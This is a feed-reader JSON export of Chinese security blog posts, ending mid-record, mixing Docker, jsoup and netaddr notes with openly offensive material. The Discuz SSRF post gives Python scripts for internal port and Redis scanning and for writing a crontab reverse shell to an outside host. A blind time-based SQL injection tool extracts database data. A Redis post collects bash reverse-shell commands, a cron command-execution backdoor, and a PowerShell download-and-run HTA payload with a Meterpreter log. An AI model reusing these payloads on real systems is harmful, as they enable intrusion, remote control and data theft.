{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 19:04:35","title":"docker学习笔记","link":"https://phpinfo.me/index.php/archives/1392/","description":"\n<p><strong>从hub.docker.com 获取镜像:</strong></p><p>docker pull nginx:1.11.1  冒号后面是版本号，默认是latest</p><p><strong>上传自己的镜像</strong></p><p>docker login 默认登录hub.docker.com</p><p>docker push 镜像名</p><p><strong>上传自己的镜像到私有仓库</strong></p><p>docker tag nginx:1.11.1 phpinfo.me:5000/lcy/nginx:1.11.1</p><p>daocker push phpinfo.me:5000/lcy/nginx:1.11.1</p><p><strong>创建容器</strong></p><p>docker run -d -p 5000:5000 --restart always --name registry -v /data/registry:/var/lib/registry registry:2</p><p>-d后台运行</p><p>-p  5000:5000 映射宿主的0.0.0.0:5000 -&#62; 容器5000端口</p><p>--restart always  容器出错自动重启</p><p>--name registry 定义一个字符串(名字)</p><p>-v /data/registry:/var/lib/registry 映射宿主机的/data/registry 到容器的/var/lib/registry</p><p>-t -i /bin/bash  -t 运行容器里的程序,-i 以交互模式运行</p><p>-m 128m 指定容器运行内存为128m</p><p>&#160;</p><p><strong>保存容器状态，把容器保存为镜像：</strong></p><p>docker commit -m \"Added json gem\" -a \"Docker Newbee\" 0b2616b0e5a8 lcys/nginx:1.11.1</p><p>-m 指定提交的说明信息，和git那个一样</p><p>-a 指定更新的用户信息</p><p>之后是用来创建镜像的容器的 ID</p><p>最后指定目标镜像的仓库名和 tag 信息</p><p><strong>容器的操作：</strong></p><p>ps 查看正在运行的容器， -a查看所有 ，-l查看历史运行（last）</p><p>run/create 启动和创建</p><em>第二个参数可以是容器的id或者names</em><p>start 对应stop的启动</p><p>stop/kali  stop停止容器，kali杀死容器</p><p>restart 重启容器</p><p>pause 暂停容器</p><p>unpause 恢复容器</p><p>logs 查看容器日志信息</p><p>stats 查看容器监控资源信息（cpu 内存 网络流量等）</p><p>top 查看容器进程信息</p><p>port 查看容器和宿主机映射端口信息</p><p>exec -it 登录容器id或名称 bash 登录容器操作（exec里面执行exit不会终止容器，而run -it里面exit会终止容器）</p><p>inspect 查看容器/镜像的详细信息</p><p>update 更新容器信息 -m 256m 更新内存为256m</p><p>cp 把容器文件copy到宿主机，或者把宿主机的文件copy到容器</p><p>docker cp 容器id或者name:/home/wwwroot/1.php /home/Lcy/ 把容器的1.php拷贝到宿主机家目录</p><p>docker cp  config.php 容器id或者name:/home/wwwroot/  把宿主机的config.php拷贝到容器</p><p>export 把容器保存为tar文件</p><p>import 把tar文件保存到镜像列表</p><p>rm  删除容器 -f强制删除</p><p>rmi  删除镜像</p><p>save 把镜像保存为tar文件</p><p>load  把镜像tar导入到镜像列表</p>\n","descriptionType":"html","publishedDate":"Mon, 17 Oct 2016 08:13:19 +0000","feedId":9920,"bgimg":"","linkMd5":"633994d0dc0034c64e12d987b44cebd7","bgimgJsdelivr":"","metaImg":"","author":"admin","publishedOrCreatedDate":1598353475042},{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 19:04:35","title":"Java爬虫框架：jsoup","link":"https://phpinfo.me/index.php/archives/1329/","description":"\n<p>jsoup 是一款Java 的HTML解析器，可直接解析某个URL地址、HTML文本内容。它提供了一套非常省力的API，可通过DOM，CSS以及类似于jQuery的操作方法来取出和操作数据。</p><pre class=\"brush: java; gutter: false\">package lcy;\n\n\n\nimport org.jsoup.Jsoup;\nimport org.jsoup.nodes.Document;\nimport org.jsoup.nodes.Element;\nimport org.jsoup.select.Elements;\n\n\npublic class Lcy {\n\tpublic static void main(String[] args) {\n\t\tString html = &#34;&#60;a href=\\&#34;http://phpinfo.me\\&#34;&#62;Lcy博客&#60;/a&#62;&#34;;\n\t\tDocument doc = Jsoup.parse(html);\n\t\tElements link = doc.getElementsByTag(&#34;a&#34;);\n\t\tElement a = link.get(0);\n\t\tSystem.out.println(a.attr(&#34;href&#34;));\n\t}\n}</pre><p><a href=\"https://phpinfo.me/usr/uploads/2016/08/123-1.png\"><img class=\"alignnone size-full wp-image-1330\" src=\"https://phpinfo.me/usr/uploads/2016/08/123-1.png\" alt=\"123\" width=\"951\" height=\"562\" /></a></p><p>&#160;</p><p>使用文档：http://www.open-open.com/jsoup/</p>\n","descriptionType":"html","publishedDate":"Mon, 22 Aug 2016 21:30:39 +0000","feedId":9920,"bgimg":"https://phpinfo.me/usr/uploads/2016/08/123-1.png","linkMd5":"8eb781d9248969b325cab76ed11cb4f3","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn71@2020_4/2020/08/25/11-04-39-239_80e40a057a4e5f46.webp","destWidth":951,"destHeight":562,"sourceBytes":65516,"destBytes":52798,"author":"admin","articleImgCdnMap":{"https://phpinfo.me/usr/uploads/2016/08/123-1.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn71@2020_4/2020/08/25/11-04-39-239_80e40a057a4e5f46.webp"},"publishedOrCreatedDate":1598353475042},{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 19:04:35","title":"Discuz ssrf漏洞利用的几个python脚本","link":"https://phpinfo.me/index.php/archives/1438/","description":"\n<p>扫描本机开放的端口：</p><pre class=\"brush: python; gutter: false\">#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Author: Lcy\n# @Date:   2016-07-05 20:55:30\n# @Last Modified by:   Lcy\n# @Last Modified time: 2016-10-10 16:26:14\nimport requests\nimport threading\nimport Queue\nimport time\n\nthreads_count = 2\nque = Queue.Queue()\nlock = threading.Lock()\nthreads = []\nports = [21,22,23,25,69,80,81,82,83,84,110,389,389,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]\nfor i in ports:\n    que.put(str(i))\ndef run():\n    while que.qsize() &#62; 0:\n        p = que.get()\n        print p + &#34;       \\r&#34;,\n        try:\n            url = &#34;http://bbs.phpinfo.me/forum.php?mod=ajax&#38;action=downremoteimg&#38;message=[img]http://tools.phpinfo.me/ssrf.php?s=ftp%26ip=127.0.0.1%26port={port}%26data=helo.jpg[/img]&quot;.format(\n                port=p)\n            r = requests.get(url,timeout=2.8)\n        except:\n            lock.acquire()\n            print &#34;{port}  Open&#34;.format(port=p)\n            lock.release()\nfor i in range(threads_count):\n    t = threading.Thread(target=run)\n    threads.append(t)\n    t.setDaemon(True)\n    t.start()\n\nwhile que.qsize() &#62; 0:\n    time.sleep(1.0)</pre><p>扫描内网开放6379端口的主机：</p><pre class=\"brush: python; gutter: false\">#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Author: Lcy\n# @Date:   2016-07-05 20:55:30\n# @Last Modified by:   Lcy\n# @Last Modified time: 2016-07-21 14:38:04\nimport requests\nimport threading\nimport Queue\nimport time\nthreads_count = 20\nque = Queue.Queue()\nlock = threading.Lock()\nthreads = []\nip = &#34;10.171.&#34;\nfor i in range(1,255):\n    for j in range(1,255):\n        que.put(ip + str(i) + &#039;.&#039;+str(j))\n# for i in range(0,255):\n#     que.put(ip + str(i))\ndef run():\n    while que.qsize() &#62; 0:\n        ip = que.get()\n        try:\n            url = &#34;http://bbs.phpinfo.me/forum.php?mod=ajax&#38;action=downremoteimg&#38;message=[img]http://tools.phpinfo.me/ssrf.php?s=ftp%26ip={ip}%26port={port}%26data=helo.jpg[/img]&quot;.format(\n                ip=ip,\n                port=&#34;65321&#34;)\n            r = requests.get(url,timeout=5)\n            \n            try:\n                url = &#34;https://bbs.phpinfo.me/forum.php?mod=ajax&#38;action=downremoteimg&#38;message=[img]http://tools.phpinfo.me/ssrf.php?s=ftp%26ip={ip}%26port={port}%26data=helo.jpg[/img]&quot;.format(\n                ip=ip,\n                port=&#34;6379&#34;)\n                r = requests.get(url,timeout=5)\n                lock.acquire()\n                print ip\n                lock.release()\n            except :\n                lock.acquire()\n                print &#34;{ip}  6379 Open&#34;.format(ip=ip)\n                lock.release()\n        except:\n            pass\n\nfor i in range(threads_count):\n    t = threading.Thread(target=run)\n    threads.append(t)\n    t.setDaemon(True)\n    t.start()\nwhile que.qsize() &#62; 0:\n    time.sleep(1.0)</pre><p>通过ssrf操作内网redis写任务计划反弹shell:</p><pre class=\"brush: python; gutter: false\">#!/usr/bin/env python\n# coding=utf-8\n# email: ringzero@0x557.org\n\nimport requests\n\nhost = &#039;10.171.26.22&#039;\nport = &#039;6379&#039;\nbhost = &#039;phpinfo.me&#039;\nbport = &#039;32&#039;\n\nvul_httpurl = &#039;https://bbs.phpinfo.me/forum.php?mod=ajax&#38;action=downremoteimg&#38;message=[img]&#039;\n\n_location = &#039;http://tools.phpinfo.me/ssrf.php&#039;\n\nshell_location = &#039;http://tools.phpinfo.me/shell.php&#039;\n\n\n#1 flush db\n\n_payload = &#039;?s=dict%26ip={host}%26port={port}%26data=flushall&#039;.format(\n\n    host = host,\n\n    port = port)\n\nexp_uri = &#039;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#039;.format(_location, _payload, vul_httpurl=vul_httpurl)\n\nprint exp_uri\n\nprint len(requests.get(exp_uri).content)\n\n\n\n#2 set crontab command\n\n_payload = &#039;?s=dict%26ip={host}%26port={port}%26bhost={bhost}%26bport={bport}&#039;.format(\n\n    host = host,\n\n    port = port,\n\n    bhost = bhost,\n\n    bport = bport)\n\nexp_uri = &#039;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#039;.format(shell_location, _payload, vul_httpurl=vul_httpurl)\n\nprint exp_uri\n\nprint len(requests.get(exp_uri).content)\n\n\n\n#3 config set dir /var/spool/cron/\n\n_payload = &#039;?s=dict%26ip={host}%26port={port}%26data=config:set:dir:/var/spool/cron/&#039;.format(\n\n    host = host,\n\n    port = port)\n\nexp_uri = &#039;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#039;.format(_location, _payload, vul_httpurl=vul_httpurl)\n\nprint exp_uri\n\nprint len(requests.get(exp_uri).content)\n\n\n\n#4 config set dbfilename root\n\n_payload = &#039;?s=dict%26ip={host}%26port={port}%26data=config:set:dbfilename:root&#039;.format(\n\n    host = host,\n\n    port = port)\n\nexp_uri = &#039;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#039;.format(_location, _payload, vul_httpurl=vul_httpurl)\n\nprint exp_uri\n\nprint len(requests.get(exp_uri).content)\n\n\n\n#5 save to file\n\n_payload = &#039;?s=dict%26ip={host}%26port={port}%26data=save&#039;.format(\n\n    host = host,\n\n    port = port)\n\nexp_uri = &#039;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#039;.format(_location, _payload, vul_httpurl=vul_httpurl)\n\nprint exp_uri\n\nprint len(requests.get(exp_uri).content)</pre><p>ssrf.php:</p><pre class=\"brush: php; gutter: false\">&#60;?php\n$ip = $_GET[&#039;ip&#039;];\n$port = $_GET[&#039;port&#039;];\n$scheme = $_GET[&#039;s&#039;];\n$data = $_GET[&#039;data&#039;];\nheader(&#34;Location: $scheme://$ip:$port/$data&#34;);\n?&#62;</pre><p>&#160;</p><p>shell.php:</p><pre class=\"brush: php; gutter: false\">&#60;?php\n$ip = $_GET[&#039;ip&#039;];\n$port = $_GET[&#039;port&#039;];\n$bhost = $_GET[&#039;bhost&#039;];\n$bport = $_GET[&#039;bport&#039;];\n$scheme = $_GET[&#039;s&#039;];\nheader(&#34;Location: $scheme://$ip:$port/set:0:\\&#34;\\\\x0a\\\\x0a*/1\\\\x20*\\\\x20*\\\\x20*\\\\x20*\\\\x20/bin/bash\\\\x20-i\\\\x20&#62;\\\\x26\\\\x20/dev/tcp/{$bhost}/{$bport}\\\\x200&#62;\\\\x261\\\\x0a\\\\x0a\\\\x0a\\&#34;&#34;);\n?&#62;</pre>\n","descriptionType":"html","publishedDate":"Thu, 23 Feb 2017 03:53:13 +0000","feedId":9920,"bgimg":"","linkMd5":"beb3a42138465eea75482cadb3f566b6","bgimgJsdelivr":"","metaImg":"","author":"admin","publishedOrCreatedDate":1598353475043},{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 19:04:35","title":"python网络地址库 netaddr 可自定义生成IP段","link":"https://phpinfo.me/index.php/archives/1259/","description":"\n<p>挺实用的，记录一下</p><p>https://netaddr.readthedocs.org/en/latest/</p><pre class=\"brush: python; gutter: false\">&#62;&#62;&#62; for ip in IPNetwork(&#039;192.0.2.0/23&#039;).iter_hosts(): \n...     print &#039;%s&#039; % ip \n... \n192.0.2.1 \n192.0.2.2 \n192.0.2.3 \n192.0.2.4 \n... \n192.0.3.251 \n192.0.3.252 \n192.0.3.253 \n192.0.3.254</pre><pre class=\"brush: python; gutter: false\">&#62;&#62;&#62; for ip in IPNetwork(&#039;192.0.2.0/23&#039;).iter_hosts(): \n...     print &#039;%s&#039; % ip \n... \n192.0.2.1 \n192.0.2.2 \n192.0.2.3 \n192.0.2.4 \n... \n192.0.3.251 \n192.0.3.252 \n192.0.3.253 \n192.0.3.254\n\n</pre><pre class=\"brush: python; gutter: false\">&#62;&#62;&#62; r1 = IPRange(&#039;192.0.2.1&#039;, &#039;192.0.2.15&#039;) \n&#62;&#62;&#62; r1 \nIPRange(&#039;192.0.2.1&#039;, &#039;192.0.2.15&#039;)</pre><pre class=\"brush: python; gutter: false\">&#62;&#62;&#62; r1.cidrs() \n[IPNetwork(&#039;192.0.2.1/32&#039;), IPNetwork(&#039;192.0.2.2/31&#039;), IPNetwork(&#039;192.0.2.4/30&#039;), IPNetwork(&#039;192.0.2.8/29&#039;)]</pre><pre class=\"brush: python; gutter: false\">&#62;&#62;&#62; subnets = list(ip.subnet(23)) \n&#62;&#62;&#62; len(subnets) \n128 \n&#62;&#62;&#62; subnets \n[IPNetwork(&#039;172.24.0.0/23&#039;), IPNetwork(&#039;172.24.2.0/23&#039;), IPNetwork(&#039;172.24.4.0/23&#039;),</pre><p>&#160;</p><p>link:http://zone.wooyun.org/content/23922</p>\n","descriptionType":"html","publishedDate":"Wed, 22 Jun 2016 06:38:20 +0000","feedId":9920,"bgimg":"","linkMd5":"8ee3f5189dcc8f82628320d269a8f264","bgimgJsdelivr":"","metaImg":"","author":"admin","publishedOrCreatedDate":1598353475042},{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 19:04:35","title":"Java版C段查询小工具","link":"https://phpinfo.me/index.php/archives/1334/","description":"\n<p>初学java swing写了个小工具</p><p>暂时没加上多线程，不过速度应该和在线版的那个差不多</p><p><a href=\"https://phpinfo.me/usr/uploads/2016/08/1234.png\"><img class=\"alignnone size-full wp-image-1335\" src=\"https://phpinfo.me/usr/uploads/2016/08/1234.png\" alt=\"1234\" width=\"1311\" height=\"704\" /></a></p><p>下载链接: <a href=\"http://pan.baidu.com/s/1i5e48Ln\" target=\"_blank\" rel=\"noopener\">http://pan.baidu.com/s/1i5e48Ln</a> 密码: e656</p><p>源码下载：<a href=\"https://phpinfo.me/usr/uploads/2016/08/Bing.zip\" target=\"_blank\" rel=\"noopener\">Bing</a></p><p>在线版查询：https://phpinfo.me/bing.php</p>\n","descriptionType":"html","publishedDate":"Wed, 24 Aug 2016 00:23:59 +0000","feedId":9920,"bgimg":"https://phpinfo.me/usr/uploads/2016/08/1234.png","linkMd5":"aba559451acfa0952fc576c0f0e7c3b4","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn60@2020_6/2020/08/25/11-04-36-994_0741929ea2fddb5a.webp","destWidth":1311,"destHeight":704,"sourceBytes":92445,"destBytes":72972,"author":"admin","articleImgCdnMap":{"https://phpinfo.me/usr/uploads/2016/08/1234.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn60@2020_6/2020/08/25/11-04-36-994_0741929ea2fddb5a.webp"},"publishedOrCreatedDate":1598353475042},{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 19:04:35","title":"python利用二进制延迟注入demo","link":"https://phpinfo.me/index.php/archives/1026/","description":"\n<p>看了freebuf的mysql延迟注入课程，感觉他那个突破延迟注入时间限制的思路非常不错</p><p>课程地址：http://yuntv.letv.com/bcloud.html?uu=cbb16903e4&#38;vu=f69b1ac857&#38;width=1024&#38;height=576</p><p>然后自己写了个py的demo，代码写的渣勿笑~</p><pre class=\"brush: python; gutter: false\">#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Author: Lcy\n# @Date:   2015-08-29 22:26:17\n# @Last Modified by:   Sunshie\n# @Last Modified time: 2015-08-30 01:48:41\n# blog:https://phpinfo.me\n# 延迟注入工具\nimport urllib2\nimport time\nimport socket\nimport threading\nimport requests\n\nclass my_threading(threading.Thread):\n\t\tdef __init__(self, str,x):\n\t\t\t\tthreading.Thread.__init__(self)\n\t\t\t\tself.str = str\n\t\t\t\tself.x = x\n\t\tdef run(self):\n\t\t\tglobal res\n\t\t\tx=self.x\n\t\t\tj = self.str\n\t\t\turl = &#34;http://localhost/demo/1.php?username=root&#039;+and+if%281=%28mid%28lpad%28bin%28ord%28mid%28%28select%20user()%29,&#34; + str(x) + &#34;,1%29%29%29,8,0%29,&#34;+ str(j) + &#34;,1%29%29,sleep%282%29,0%29%23&#34;\n\t\t\thtml = request(url) \n\t\t\tverify = &#039;timeout&#039; \n\t\t\tif verify not in html: \n\t\t\t\tres[str(j)] = 0\n\t\t\t\t#print 1\n\t\t\telse:\n\t\t\t\tres[str(j)] = 1\n\t\n\ndef request(URL): \n\tuser_agent = { &#039;User-Agent&#039; : &#039;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10&#039; } \n\treq = urllib2.Request(URL, None, user_agent)  \n\ttry: \n\t\trequest = urllib2.urlopen(req,timeout=2) \n\texcept Exception ,e: \n\t\ttime.sleep(2)\n\t\treturn &#039;timeout&#039; \n\treturn request.read() \t\n\ndef curl(url):\n\ttry:\n\t\t\tstart = time.clock()\n\t\t\trequests.get(url)\n\t\t\tend = time.clock()\n\t\t\treturn int(end)\n\texcept requests.RequestException as e:\n\t\t\tprint u&#34;访问出错!&#34;\n\t\t\texit()\ndef getLength():\n\ti = 0\n\twhile True:\n\t\tprint &#34;[+] Checking: %s \\r&#34; %i\n\t\turl = &#34;http://localhost/demo/1.php?username=root&#039;+and+sleep(if(length((select%20user()))=&#34;+ str(i) +&#34;,1,0))%23&#34;\n\t\thtml = request(url) \n\t\tverify = &#039;timeout&#039; \n\t\tif verify in html: \n\t\t\tprint u&#34;[+] 数据长度为： %s&#34; %i\n\t\t\treturn i\n\t\t\n\t\ti = i + 1\ndef bin2dec(string_num):\n\treturn int(string_num, 2)\n\ndef getData(dataLength):\n\tglobal res\n\tdata = &#34;&#34;\n\tfor x in range(dataLength):\n\t\tx = x + 1\n\t\t#print x\n\t\tthreads = []\n\t\tfor j in range(8):\n\t\t\tresult = &#34;&#34;\n\t\t\tj = j + 1\n\t\t\tsb = my_threading(j,x)\n\t\t\tsb.setDaemon(True)\n\t\t\tthreads.append(sb)\n\t\t\t#print j\n\t\tfor t in threads:\n\t\t\t\tt.start()\n\t\tfor t in threads:\n\t\t\t\tt.join()\n\t\t#print res\n\t\ttmp = &#34;&#34;\n\t\tfor i in range(8):\n\t\t\ttmp = tmp + str(res[str(i+1)])\n\t\t#print chr(bin2dec(tmp))\n\t\tres = {}\n\t\tresult = chr(bin2dec(tmp))\n\t\tprint result\n\t\tdata = data + result\n\t\tsb = None\n\tprint &#34;[+] ok!&#34;\n\tprint &#34;[+] result:&#34; + data\n\n\nif __name__ == &#039;__main__&#039;:\n\tstop = False\n\tres = {}\n\tlength = getLength()\n\tgetData(length)</pre><p>1.php代码如下：</p><pre class=\"brush: php; gutter: false\">&#60;?php\n/* \n* @Author: Lcy\n* @Date:   2015-08-29 22:09:59\n* @Last Modified by:   Sunshie\n* @Last Modified time: 2015-08-30 01:46:17\n* 延迟注入测试\n*/\nheader(&#34;Content-type:text/html;charset=utf8&#34;);\n$link = mysql_connect(&#34;localhost&#34;, &#34;root&#34;,&#34;&#34;);\nmysql_select_db(&#34;mysql&#34;, $link);\nmysql_set_charset(&#34;utf8&#34;);\n$sql = &#34;SELECT user FROM user where user=&#039;{$_GET[&#039;username&#039;]}&#039;&#34;;\necho $sql;\n$query = mysql_query($sql);\necho &#34;这是一个没有任何回显的注入点&#34;;\n\n?&#62;</pre><p><a href=\"https://phpinfo.me/usr/uploads/2015/08/py.png\"><img class=\"alignnone size-medium wp-image-1027\" src=\"https://phpinfo.me/usr/uploads/2015/08/py-300x242.png\" alt=\"py\" width=\"300\" height=\"242\" /></a></p><p>如果要爆数据啥的话就改py代码里面的select%20user()，替换为你要执行的sql即可</p>\n","descriptionType":"html","publishedDate":"Sat, 29 Aug 2015 17:53:50 +0000","feedId":9920,"bgimg":"https://phpinfo.me/usr/uploads/2015/08/py-300x242.png","linkMd5":"f4710662db36962f369bf8790902c3c7","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn67@2020_1/2020/08/25/11-04-36-780_b4e724604285033c.webp","destWidth":300,"destHeight":242,"sourceBytes":18500,"destBytes":4590,"author":"admin","articleImgCdnMap":{"https://phpinfo.me/usr/uploads/2015/08/py-300x242.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn67@2020_1/2020/08/25/11-04-36-780_b4e724604285033c.webp"},"publishedOrCreatedDate":1598353475043},{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 19:04:35","title":"使用figlet生成字符画","link":"https://phpinfo.me/index.php/archives/1255/","description":"\n<p>安装：apt-get install figlet</p><p>执行 figlet phpinfo.me 效果如下<br />\n<a href=\"https://phpinfo.me/usr/uploads/2016/06/1.png\"><img class=\"alignnone size-full wp-image-1256\" src=\"https://phpinfo.me/usr/uploads/2016/06/1.png\" alt=\"1\" width=\"434\" height=\"142\" /></a></p><p>&#160;</p><p>&#160;</p><p>&#160;</p><p>使用字体生成，wget ftp://ftp.figlet.org/pub/figlet/fonts/contributed/larry3d.flf</p><p>然后执行 figlet -f larry3d phpinfo.me</p><p><a href=\"https://phpinfo.me/usr/uploads/2016/06/2.png\"><img class=\"alignnone size-full wp-image-1257\" src=\"https://phpinfo.me/usr/uploads/2016/06/2.png\" alt=\"2\" width=\"586\" height=\"264\" /></a></p>\n","descriptionType":"html","publishedDate":"Wed, 22 Jun 2016 05:39:39 +0000","feedId":9920,"bgimg":"https://phpinfo.me/usr/uploads/2016/06/1.png","linkMd5":"4d074c6d5e5ab3aa16b9a28878d5557c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn76@2020_6/2020/08/25/11-04-36-762_f5fc81956faa5c03.webp","destWidth":434,"destHeight":142,"sourceBytes":3919,"destBytes":7780,"author":"admin","articleImgCdnMap":{"https://phpinfo.me/usr/uploads/2016/06/1.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn76@2020_6/2020/08/25/11-04-36-762_f5fc81956faa5c03.webp","https://phpinfo.me/usr/uploads/2016/06/2.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn83@2020_1/2020/08/25/11-04-41-789_f0cc7cf91402decb.webp"},"publishedOrCreatedDate":1598353475042},{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 19:04:35","title":"redis利用姿势收集","link":"https://phpinfo.me/index.php/archives/1275/","description":"\n<p><a style=\"display: none;\" href=\"https://phpinfo.me/usr/uploads/2016/07/redis.png\"><img class=\"alignnone size-full wp-image-1316\" src=\"https://phpinfo.me/usr/uploads/2016/07/redis.png\" alt=\"redis\" width=\"247\" height=\"220\"></a></p><p>linux利用（转自wooyun）</p><p>redis的exploit，完全不需要flushall破坏数据场景，redis-cli set 1 'ringzero'，这样可以控制第一条记录，就能保证你的内容始终保持在最前面；</p><p>测试环境：CentOS，RHEL</p><p># 利用crontab反弹shell</p><pre class=\"brush: bash; gutter: false\">redis-cli flushall \necho -e &#34;\\n\\n*/1 * * * * /bin/bash -i &#62;&#38; /dev/tcp/114.114.114.114/53 0&#62;&#38;1\\n\\n&#34;|redis-cli -x set 1 \nredis-cli config set dir /var/spool/cron/ \nredis-cli config set dbfilename root \nredis-cli save</pre><p># 利用crontab创建文件 /tmp/888</p><pre class=\"brush: bash; gutter: false\">redis-cli flushall # 为了方便测试 \nredis-cli set test &#039;test&#039; \nredis-cli set my &#039;mymymymymymymymymymymymy&#039; \nredis-cli set word &#039;wordwordwordwordwordword&#039; \nredis-cli set hello &#039;ringzero&#039; \nredis-cli set word1 &#039;word1word1word1word1word1word1&#039; \necho -e &#34;\\n\\n*/1 * * * * /bin/touch /tmp/888\\n\\n&#34;|redis-cli -x set 1 \nredis-cli config set dir /var/spool/cron/ \nredis-cli config set dbfilename root \nredis-cli save</pre><pre class=\"brush: bash; gutter: false\">redis-cli flushall \necho -e &#34;\\n\\n*/1 * * * * /bin/touch /tmp/888\\n\\n&#34;|redis-cli -x set 1 \nredis-cli config set dir /var/spool/cron/ \nredis-cli config set dbfilename root \nredis-cli save</pre><p># 二次改写crontab</p><pre class=\"brush: bash; gutter: false\">redis-cli flushall \nredis-cli set 2 &#039;;a=`redis-cli get c`;&#039; \nredis-cli set 1 &#039;id;redis-cli set r `$a`;#&#039; \nredis-cli config set dir /tmp/ \nredis-cli config set dbfilename w \nredis-cli save \nredis-cli set c whoami</pre><p># 利用第一步的写crontab步骤，完成下面的命令</p><pre class=\"brush: bash; gutter: false\">echo &#34; &#34; &#62; /tmp/zz \ncat /tmp/w &#62;&#62; /tmp/zz \n/bin/sh /tmp/zz \nredis-cli get r</pre><p>控制 /var/spool/cron/root 和 /tmp/zz</p><p># 最终实现，每10秒从redis的c变量读入要执行的命令，再将执行结果写入变量r</p><pre class=\"brush: bash; gutter: false\">* * * * * sleep 10;/bin/sh /tmp/zz</pre><p>windows利用方式（转自90sec）</p><p><span style=\"font-family: Arial, Helvetica, sans-serif;\"><strong><span style=\"color: #ff0000;\">redis</span></strong> 官方未发布windows版本，但是野外存在redis/win版本。</span></p><p><span style=\"font-family: Arial, Helvetica, sans-serif;\">在测试时发现一windows版本redis，遂开始搞。</span></p><p><span style=\"font-family: Arial, Helvetica, sans-serif;\">直接上利用，基于msf:</span></p><pre class=\"brush: actionscript3; gutter: false\">root@weisuo.org:~# cat hta-psh.txt \n &#60;scRipt language=&#34;VBscRipT&#34;&#62;CreateObject(&#34;WscrIpt.SheLL&#34;).Run &#34;powershell -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString(&#039;http://119.91.129.12:8080/1.ps1&#039;)&#34;&#60;/scRipt&#62;\n[url=mailto:root@weisuo.org]root@weisuo.org[/url]:~#  cat hta-psh.txt |redis-cli -x -h 192.168.138.27 set a\nOK</pre><p>hta-psh.txt 对一些字符串进行变通，如不，在写入时会导致字符串丢失。</p><pre class=\"brush: actionscript3; gutter: false\">#msfconsole \nuse payload/windows/meterpreter/reverse_tcp\ngenerate -t hta-psh -f /var/www/1.ps1\n#之后起个handle，略</pre><p><span style=\"font-family: Arial, Helvetica, sans-serif;\">修改1.ps1，文件内容大概如下：</span></p><p><span style=\"font-family: Arial, Helvetica, sans-serif;\">$command=\"powershell -nop -w hidden -e xxxxxxxxxxxxxxxx\";iex $command;$command2=\"taskkill /im mshta.exe\";iex $command2;</span></p><p><span style=\"font-family: Arial, Helvetica, sans-serif;\">最后写入文件，等待管理员登陆</span></p><pre class=\"brush: actionscript3; gutter: false\">oot@xxx:~# redis-cli -h 192.168.138.27\nredis 192.168.138.27:6379&#62; CONFIG GET dir\n1) &#34;dir&#34;\n2) &#34;C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup&#34;\nredis 192.168.138.27:6379&#62; config get dbfilename\n1) &#34;dbfilename&#34;\n2) &#34;2.hta&#34;\nredis 192.168.138.27:6379&#62; save\nOK\nredis 192.168.138.27:6379&#62;[/p][p=20, null, left]</pre><p>&#160;</p><pre class=\"brush: actionscript3; gutter: false\">msf exploit(handler) &#62; rexploit -j -z\n[*] Stopping existing job...\n[*] Reloading module...\n[*] Exploit running as background job.\n \n[*] Started reverse TCP handler on x.x.x.x:80\nmsf exploit(handler) &#62; [*] Starting the payload handler...\n[*] Sending stage (957999 bytes) to x.x.x.x\n[*] Meterpreter session 4 opened (x.x.x.x:80 -&#62; x.x.x.x:56301) at 2016-06-06 11:06:00 -0400\n[*] Session ID 4 (x.x.x.x:80 -&#62; x.x.x.x:56301) processing AutoRunScript &#039;migrate -f&#039;\n[*] Current server process: powershell.exe (4896)\n[*] Spawning notepad.exe process to migrate to\n[+] Migrating to 3768\n[+] Successfully migrated to process</pre>\n","descriptionType":"html","publishedDate":"Thu, 07 Jul 2016 00:47:16 +0000","feedId":9920,"bgimg":"","linkMd5":"5a7a82ce5ed5956ed159148eacbbe9bc","bgimgJsdelivr":"","metaImg":"","author":"admin","articleImgCdnMap":{"https://phpinfo.me/usr/uploads/2016/07/redis.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn80@2020_2/2020/08/25/11-04-42-555_991304b201edf20e.webp"},"publishedOrCreatedDate":1598353475043},{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 